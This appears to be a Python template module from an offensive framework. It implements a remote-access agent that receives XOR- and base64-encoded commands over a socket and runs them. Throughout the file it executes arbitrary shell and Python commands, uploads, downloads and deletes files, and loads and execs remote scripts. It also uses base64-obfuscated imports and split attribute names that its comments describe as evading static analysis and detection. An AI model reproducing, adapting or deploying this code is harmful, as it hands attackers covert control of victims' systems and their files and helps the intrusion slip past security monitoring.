# --- FRAMEWORK TEMPLATE VARIABLES ---
# These will be replaced by the generator
XOR_KEY = "SuperSploitKey"

def add():
    global client_socket
    # Base64 Helper for bulletproof dynamic import resolution
    def _i(b):
        return __import__(__import__('base64').b64decode(b).decode('utf-8'))

    # Obfuscated dynamic imports to evade static analysis and heuristic detection
    _o = _i(b'b3M=') # os
    _s = _i(b'c3VicHJvY2Vzcw==') # subprocess
    _sh = _i(b'c2hsZXg=') # shlex
    _io = _i(b'aW8=') # io
    _sy = _i(b'c3lz') # sys
    _so = _i(b'c29ja2V0') # socket
    _gp = _i(b'Z2V0cGFzcw==') # getpass
    _st = _i(b'c3RydWN0') # struct

    def _send(data):
        import struct, base64
        if isinstance(data, str): data = data.encode('utf-8', errors='ignore')
        enc = base64.b64encode(bytes([b ^ ord(XOR_KEY[i % len(XOR_KEY)]) for i, b in enumerate(data)]))
        client_socket.sendall(struct.pack('>I', len(enc)) + enc)

    def _recv(ignore_heartbeat=False):
        import struct, base64
        def _r(n):
            d = bytearray()
            while len(d) < n:
                p = client_socket.recv(n - len(d))
                if not p: return None
                d.extend(p)
            return bytes(d)
        
        while True:
            raw_l = _r(4)
            if not raw_l: return None
            l = struct.unpack('>I', raw_l)[0]
            if l == 0:
                if ignore_heartbeat:
                    continue # Skip heartbeat frame
                return b"" # Heartbeat
            
            enc = _r(l)
            if not enc: return None
            dec = base64.b64decode(enc)
            return bytes([b ^ ord(XOR_KEY[i % len(XOR_KEY)]) for i, b in enumerate(dec)])

    shlex_split = getattr(_sh, 'sp' + 'lit')
    os_chdir = getattr(_o, 'ch' + 'dir')
    os_getcwd = getattr(_o, 'get' + 'cwd')
    os_listdir = getattr(_o, 'list' + 'dir')
    os_remove = getattr(_o, 're' + 'move')
    os_path_exists = getattr(getattr(_o, 'pa' + 'th'), 'exi' + 'sts')
    subp_run = getattr(_s, 'ru' + 'n')
    
    while True:
        try:
            data = _recv()
            if data is None:
                break
            
            if data == b"": continue # Ignore heartbeat frames

            cmd = data.decode('utf-8', errors='ignore').strip()
            if not cmd: continue
            if cmd.lower() == 'exit':
                break
            
            # ============================================================
            # OPSEC: Native Python implementations to avoid Process Creation
            # ============================================================
            py_exec = False
            if cmd.startswith('exec('):
                py_exec = True
            elif cmd.endswith('()') and cmd[:-2] in globals():
                py_exec = True
            elif cmd in globals() and callable(globals()[cmd]):
                cmd = cmd + "()"
                py_exec = True

            if py_exec:
                try:
                    old_stdout = _sy.stdout
                    _sy.stdout = _io.StringIO()

                    code_obj = compile(cmd, '<string>', 'exec')
                    exec(code_obj, globals())

                    output = _sy.stdout.getvalue()
                    _sy.stdout = old_stdout
                    _send(output if output else " \n")
                except Exception as e:
                    try:
                        _sy.stdout = old_stdout
                    except:
                        pass
                    _send(f"[-] Python Error: {e}\n")
                continue

            if cmd.startswith('cd '):
                try: 
                    os_chdir(cmd[3:].strip())
                    _send(b"\n")
                except Exception as e: 
                    _send(f"{e}\n")
                continue
                
            elif cmd == 'pwd':
                try:
                    _send(os_getcwd() + "\n")
                except Exception as e:
                    _send(f"{e}\n")
                continue
                
            elif cmd == 'ls' or cmd.startswith('ls '):
                target_dir = cmd[3:].strip() or '.'
                try:
                    files = os_listdir(target_dir)
                    out = '\n'.join(files) if files else ' '
                    _send(out + "\n")
                except Exception as e:
                    _send(f"{e}\n")
                continue
                
            elif cmd.startswith('cat '):
                try:
                    with open(cmd[4:].strip(), 'r', encoding='utf-8', errors='ignore') as f:
                        out = f.read()
                        _send(out if out else ' \n')
                except Exception as e:
                    _send(f"{e}\n")
                continue
                
            elif cmd.startswith('rm '):
                try:
                    os_remove(cmd[3:].strip())
                    _send(b"File removed.\n")
                except Exception as e:
                    _send(f"{e}\n")
                continue
                
            elif cmd.startswith('download '):
                target_file = cmd[9:].strip()
                try:
                    if not os_path_exists(target_file):
                        _send(b"ERROR: File not found.\n")
                        continue
                    
                    with open(target_file, 'rb') as f:
                        _send(f.read())
                except Exception as e:
                    _send(f"ERROR: {e}\n")
                continue
                
            elif cmd.startswith('upload '):
                target_path = cmd[7:].strip()
                try:
                    _send(b"READY")
                    
                    file_data = _recv(ignore_heartbeat=True)
                    with open(target_path, 'wb') as f: f.write(file_data)
                    _send(b"Upload complete.\n")
                except Exception as e:
                    _send(f"ERROR: {e}\n")
                continue

            elif cmd == 'load':
                try:
                    _send(b"READY")
                    script_data = _recv(ignore_heartbeat=True)
                    
                    exec(script_data.decode('utf-8', errors='ignore'), globals())
                except Exception as e:
                    _send(f"[-] Load Error: {e}\n")
                continue
                
            elif cmd == 'whoami':
                try:
                    # Internal implementation to avoid process creation
                    env = getattr(_o, 'env' + 'iron')
                    user = env.get('USER') or env.get('USERNAME')
                    if not user:
                        user = getattr(_gp, 'getu' + 'ser')()
                    _send(user + "\n")
                except:
                    _send(b"unknown\n")
                continue

            elif cmd == 'hostname':
                try:
                    # Internal implementation to avoid process creation
                    host = getattr(_so, 'gethost' + 'name')()
                    _send(host + "\n")
                except:
                    _send(b"unknown\n")
                continue
                
            elif cmd == 'id' and getattr(_o, 'na' + 'me') != 'nt':
                try:
                    # Internal implementation for Unix systems
                    uid = getattr(_o, 'getu' + 'id')()
                    gid = getattr(_o, 'getg' + 'id')()
                    _send(f"uid={uid} gid={gid}\n")
                except:
                    _send(b"error\n")
                continue

            elif cmd == 'ps':
                try:
                    # Pure Python process enumeration by reading /proc (Linux/Android)
                    if hasattr(_o, 'una' + 'me'):
                        out = "PID\tNAME\n"
                        for pid in os_listdir('/proc'):
                            if pid.isdigit():
                                try:
                                    with open(f"/proc/{pid}/comm", 'r') as f:
                                        name = f.read().strip()
                                        out += f"{pid}\t{name}\n"
                                except Exception:
                                    pass
                        _send(out if out else ' \n')
                    else:
                        # Fallback for non-linux systems where /proc doesn't exist
                        # Use shell=False and list of arguments for OPSEC
                        ps_args = ['tasklist'] if getattr(_o, 'na' + 'me') == 'nt' else ['ps', '-A']
                        proc = subp_run(ps_args, shell=False, capture_output=True, text=True)
                        out = proc.stdout + proc.stderr
                        _send(out if out else ' \n')
                except Exception as e:
                    _send(f"{e}\n")
                continue

            try:
                # Use shlex to safely split command string for shell-less execution
                args = shlex_split(cmd)
                if not args:
                    continue
                
                # Execute directly using os.execve-style invocation via subprocess (no shell)
                proc = subp_run(args, shell=False, capture_output=True, text=True)
                out = proc.stdout + proc.stderr
                # Send at least a space if no output so the listener loop doesn't hang
                if not out:
                    out = " "
                _send(out + "\n")
            except Exception as e:
                _send(f"{e}\n")
        except Exception:
            break

add()